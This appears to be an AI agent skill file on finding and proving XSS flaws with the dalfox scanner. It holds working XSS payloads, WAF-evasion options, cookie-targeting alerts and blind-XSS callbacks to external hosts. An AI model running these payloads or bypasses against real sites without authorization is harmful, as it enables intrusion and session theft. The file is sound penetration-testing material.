---
name: xss-poc
description: Detect and exploit XSS vulnerabilities using automated scanning with dalfox. Use when testing for reflected XSS, stored XSS, DOM-based XSS, blind XSS, when analyzing parameter reflection, or when validating XSS findings with proof of concept.
tags:
  - security
  - xss
  - cross-site-scripting
  - dalfox
  - reflected
  - stored
triggers:
  - xss
  - cross site scripting
  - xss exploit
  - reflected xss
  - stored xss
  - dalfox
---

# xss-poc

## When to Use

- User requests XSS testing or cross-site scripting detection
- Testing reflected XSS on URL parameters or form inputs
- Testing stored XSS with payload injection and trigger verification
- Testing DOM-based XSS or JavaScript context injection
- Setting up blind XSS with callback/webhook verification
- Analyzing parameter reflection and injection contexts
- Generating XSS proof of concept payloads
- Bypassing WAF or filter mechanisms during XSS testing
- Validating XSS findings from other scanners

## Quick Start

```bash
# Basic reflected XSS scan
dalfox url "https://target.com/search?q=test"

# Blind XSS with callback
dalfox url "https://target.com/contact?msg=test" -b https://your-callback.xss.ht

# Stored XSS scan
dalfox sxss "https://target.com/post" -d "comment=test" --trigger "https://target.com/view"
```

## Scan Modes

### URL Mode - Single Target

Scan single URL with parameters:

```bash
# Basic scan
dalfox url "https://target.com/page?param=value"

# With specific parameters
dalfox url "https://target.com/page" -p search -p query -p id
```

### File Mode - Multiple URLs

Scan URLs from file:

```bash
# URLs file (one per line)
dalfox file urls.txt

# With custom payloads
dalfox file urls.txt --custom-payload payloads.txt
```

### Pipe Mode - Stdin Input

Process URLs from pipeline:

```bash
# From URL list
cat urls.txt | dalfox pipe

# From crawler
katana -u https://target.com | dalfox pipe -b https://callback.xss.ht
```

### SXSS Mode - Stored XSS

Test stored XSS with trigger verification:

```bash
# POST injection, GET verification
dalfox sxss "https://target.com/submit" -d "field=value" --trigger "https://target.com/view"

# POST injection, POST trigger
dalfox sxss "https://target.com/api/post" -d "content=test" \
  --trigger "https://target.com/api/read" --request-method POST
```

### Payload Mode - Generate Payloads

Generate XSS payloads without scanning:

```bash
# Bulk payloads for stored XSS
dalfox payload --make-bulk

# Specific contexts
dalfox payload --enum-html --enum-attr --enum-injs

# With URL encoding
dalfox payload --enum-common --encoder-url
```

### Server Mode - REST API

Run dalfox as REST API server:

```bash
# Start server
dalfox server --host 0.0.0.0 --port 8090
```

## Step-by-Step Process

### 1. Parameter Discovery and Analysis

```bash
# Basic scan with all mining enabled (default)
dalfox url "https://target.com/search?q=test"

# DOM-based parameter mining
dalfox url "https://target.com/page" --mining-dom

# Dictionary-based mining with custom wordlist
dalfox url "https://target.com/page" -W params.txt
```

### 2. Reflection Analysis

```bash
# Discovery only (no XSS scanning)
dalfox url "https://target.com/search?q=test" --only-discovery

# Skip to XSS scanning (known params)
dalfox url "https://target.com/search?q=test" --skip-discovery -p q
```

### 3. XSS Payload Testing

```bash
# Full scan with remote payloads
dalfox url "https://target.com/search?q=test" \
  --remote-payloads portswigger,payloadbox

# Custom payloads only
dalfox url "https://target.com/search?q=test" \
  --custom-payload xss-payloads.txt --only-custom-payload
```

### 4. Verification and Validation

```bash
# Deep DOM XSS verification
dalfox url "https://target.com/page?q=test" --deep-domxss

# Force headless verification
dalfox url "https://target.com/page?q=test" --force-headless-verification
```

### 5. Generate Report

```bash
# JSON output
dalfox url "https://target.com/search?q=test" --format json -o results.json

# Full report
dalfox url "https://target.com/search?q=test" --report --output-all -o report.txt
```

## Examples

### Example 1: Basic Reflected XSS Detection

**Scenario:** Test search parameter for XSS

**Command:**

```bash
dalfox url "https://target.com/search?q=test" --format json
```

**Output:**

```json
{
  "type": "xss",
  "parameter": "q",
  "verified": true,
  "payload": "<script>alert(1)</script>",
  "poc": "https://target.com/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
  "context": "html_body"
}
```

### Example 2: Blind XSS Testing

**Scenario:** Test contact form for blind XSS with callback

**Command:**

```bash
dalfox url "https://target.com/contact?name=test&message=test" \
  -b https://your.xss.ht/callback \
  --format json
```

**Output:**

```
[*] Using single target mode
[*] Target URL: https://target.com/contact
[*] Blind XSS callback: https://your.xss.ht/callback
[*] Injecting blind XSS payloads...
[*] Parameter analysis done ✓
[*] XSS Scanning with blind payloads...
[*] Finish - check callback server for triggers
```

### Example 3: Stored XSS Detection

**Scenario:** Test comment submission and verify on view page

**Command:**

```bash
dalfox sxss "https://target.com/api/comment" \
  -d "post_id=123&content=test" \
  --trigger "https://target.com/post/123" \
  --format json
```

**Output:**

```json
{
  "type": "stored_xss",
  "injection_point": "https://target.com/api/comment",
  "trigger_url": "https://target.com/post/123",
  "parameter": "content",
  "payload": "<img src=x onerror=alert(1)>",
  "verified": true
}
```

### Example 4: DOM-Based XSS Deep Scan

**Scenario:** Test for DOM XSS with headless verification

**Command:**

```bash
dalfox url "https://target.com/app?input=test" \
  --deep-domxss \
  --force-headless-verification \
  --format json
```

**Output:**

```json
{
  "type": "dom_xss",
  "parameter": "input",
  "sink": "innerHTML",
  "source": "location.search",
  "payload": "<img src=x onerror=alert(document.domain)>",
  "verified": true,
  "verification_method": "headless"
}
```

### Example 5: WAF Bypass Testing

**Scenario:** Test XSS against WAF-protected target

**Command:**

```bash
dalfox url "https://waf-target.com/search?q=test" \
  --waf-evasion \
  --remote-payloads portswigger \
  --custom-payload waf-bypass.txt \
  --delay 1000 \
  -w 1
```

**Output:**

```
[*] WAF evasion mode enabled
[*] Adjusting scan speed: worker=1, delay=1000ms
[*] Loading remote payloads from PortSwigger...
[*] Loading custom payloads: waf-bypass.txt
[V] Triggered XSS with WAF bypass: <svg/onload=alert(1)>
[POC] https://waf-target.com/search?q=%3Csvg/onload%3Dalert%281%29%3E
```

### Example 6: Multiple Parameters Testing

**Scenario:** Test specific parameters with authentication

**Command:**

```bash
dalfox url "https://target.com/profile" \
  -p username -p bio -p website \
  -H "Authorization: Bearer eyJ..." \
  -C "session=abc123" \
  --format json
```

**Output:**

```json
{
  "vulnerabilities": [
    { "parameter": "bio", "type": "xss", "verified": true },
    { "parameter": "website", "type": "xss", "verified": true }
  ],
  "safe_parameters": ["username"]
}
```

### Example 7: Pipeline Integration

**Scenario:** Chain with crawler for comprehensive testing

**Command:**

```bash
# Crawl and filter potential XSS endpoints
katana -u https://target.com -d 3 -jc | \
  grep "=" | \
  qsreplace "FUZZ" | \
  sort -u | \
  dalfox pipe -b https://callback.xss.ht --silence
```

**Output:**

```
[V] https://target.com/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
[V] https://target.com/page?ref=%22%3E%3Csvg/onload%3Dalert%281%29%3E
[G] https://target.com/api?data=%27%3Balert%281%29//
```

### Example 8: Custom Alert Configuration

**Scenario:** Use document.cookie in XSS verification

**Command:**

```bash
dalfox url "https://target.com/vuln?q=test" \
  --custom-alert-value "document.cookie" \
  --custom-alert-type str
```

**Output:**

```
[V] Triggered XSS: <script>alert("document.cookie")</script>
[V] Triggered XSS: <img src=x onerror=alert('document.cookie')>
```

### Example 9: POST Data Testing

**Scenario:** Test login form with POST method

**Command:**

```bash
dalfox url "https://target.com/login" \
  -X POST \
  -d "username=admin&password=test&remember=1" \
  -p username -p password \
  --format json
```

**Output:**

```json
{
  "method": "POST",
  "parameters_tested": ["username", "password"],
  "vulnerabilities": [
    {
      "parameter": "username",
      "payload": "admin<script>alert(1)</script>",
      "verified": true
    }
  ]
}
```

### Example 10: Comprehensive Bug Bounty Scan

**Scenario:** Full XSS assessment with all features

**Command:**

```bash
dalfox url "https://target.com/app?q=test" \
  --mining-dom --deep-domxss \
  --remote-payloads portswigger,payloadbox \
  -b https://your.xss.ht \
  --report --format json -o full-report.json
```

## Error Handling

| Error                   | Cause                    | Resolution                               |
| ----------------------- | ------------------------ | ---------------------------------------- |
| `Browser not installed` | Headless browser missing | Run `dalfox install` or install chromium |
| `Connection refused`    | Target unreachable       | Verify URL, check network connectivity   |
| `403 Forbidden`         | WAF blocking             | Enable `--waf-evasion`, reduce speed     |
| `Timeout exceeded`      | Slow response            | Increase `--timeout` value               |
| `No parameters found`   | No testable params       | Use `-p` flag to specify manually        |
| `Invalid URL format`    | Malformed URL            | Ensure URL includes protocol             |
| `Rate limited`          | Too many requests        | Increase `--delay`, reduce `-w` workers  |
| `Certificate error`     | SSL/TLS issue            | Use `--skip-headless` or fix cert        |

## XSS Context Types

| Context         | Description            | Example Payload               |
| --------------- | ---------------------- | ----------------------------- |
| `inHTML-none`   | Direct HTML injection  | `<script>alert(1)</script>`   |
| `inHTML-single` | Inside single quotes   | `'><script>alert(1)</script>` |
| `inHTML-double` | Inside double quotes   | `"><script>alert(1)</script>` |
| `inATTR`        | Inside HTML attribute  | `" onmouseover=alert(1)`      |
| `inJS-none`     | In JavaScript context  | `</script><script>alert(1)`   |
| `inJS-single`   | In JS single quote     | `';alert(1)//`                |
| `inJS-double`   | In JS double quote     | `";alert(1)//`                |
| `inJS-backtick` | In JS template literal | `${alert(1)}`                 |

## Remote Payload Sources

| Source        | Payloads | Focus                                                  |
| ------------- | -------- | ------------------------------------------------------ |
| `portswigger` | ~100     | Browser-specific, event handlers, HTML5, filter bypass |
| `payloadbox`  | ~200     | Basic to advanced, context-specific, DOM XSS           |

## Command Reference

| Flag                            | Description                             |
| ------------------------------- | --------------------------------------- |
| `-b, --blind`                   | Blind XSS callback URL                  |
| `-p, --param`                   | Specific parameters to test             |
| `-d, --data`                    | POST body data                          |
| `-X, --method`                  | HTTP method (GET/POST)                  |
| `-H, --header`                  | Custom HTTP header                      |
| `-C, --cookie`                  | Custom cookie                           |
| `-o, --output`                  | Output file path                        |
| `--format`                      | Output format (plain/json/jsonl)        |
| `--mining-dom`                  | DOM-based param mining (default: true)  |
| `--mining-dict`                 | Dictionary param mining (default: true) |
| `-W, --mining-dict-word`        | Custom wordlist for mining              |
| `--only-discovery`              | Discovery only, skip XSS scan           |
| `--skip-discovery`              | Skip discovery, scan known params       |
| `--custom-payload`              | Custom payload file                     |
| `--only-custom-payload`         | Use only custom payloads                |
| `--remote-payloads`             | Remote sources (portswigger,payloadbox) |
| `--custom-alert-type`           | Alert type (none/str)                   |
| `--custom-alert-value`          | Custom alert value                      |
| `--deep-domxss`                 | Deep DOM XSS analysis (slow)            |
| `--force-headless-verification` | Force browser verification              |
| `--skip-bav`                    | Skip basic vuln analysis                |
| `--skip-headless`               | Skip headless scanning                  |
| `-w, --worker`                  | Concurrent workers (default: 100)       |
| `--delay`                       | Delay between requests (ms)             |
| `--timeout`                     | Request timeout (default: 10s)          |
| `--waf-evasion`                 | Enable WAF bypass mode                  |
| `--ignore-return`               | Ignore HTTP codes (e.g., 302,403)       |
| `-F, --follow-redirects`        | Follow HTTP redirects                   |
| `--proxy`                       | Proxy URL                               |
| `--report`                      | Generate report                         |
| `--output-all`                  | Output all findings                     |
| `-S, --silence`                 | Silent mode                             |
| `--ignore-param`                | Skip testing specific params            |
| `--trigger`                     | Stored XSS verification URL             |
| `--request-method`              | HTTP method for trigger URL             |

## Output Parsing

```bash
# JSON output
dalfox url "https://target.com/search?q=test" --format json 2>/dev/null

# Extract POC URLs with jq
dalfox url "https://target.com?q=test" --format json 2>/dev/null | jq -r '.vulnerabilities[].poc'

# Get verified XSS only
dalfox url "https://target.com?q=test" --format json 2>/dev/null | \
  jq '.vulnerabilities[] | select(.verified == true)'
```

**JSON Structure:**

```json
{
  "metadata": { "version": "2.9.1", "target": "...", "scanDuration": 23.4 },
  "parameters": [{ "name": "q", "reflectionCount": 3, "context": "html" }],
  "vulnerabilities": [
    {
      "type": "xss",
      "parameter": "q",
      "verified": true,
      "payload": "...",
      "poc": "..."
    }
  ]
}
```

## Best Practices

1. **Discovery First** - Start with `--only-discovery` to identify parameters
2. **Specific Params** - Use `-p` flags for known parameters to speed scans
3. **WAF Handling** - Enable `--waf-evasion` and reduce workers for protected targets
4. **Verify Findings** - Use `--force-headless-verification` for critical findings
5. **Blind XSS** - Always verify blind XSS manually via callback server
6. **Stored XSS** - Check trigger URLs manually after injection
7. **Payload Strategy** - Start built-in, add remote, then custom for specific contexts

## References

- [Dalfox GitHub Repository](https://github.com/hahwul/dalfox)
- [Dalfox Official Documentation](https://dalfox.hahwul.com)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadBox XSS Payloads](https://github.com/payloadbox/xss-payload-list)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
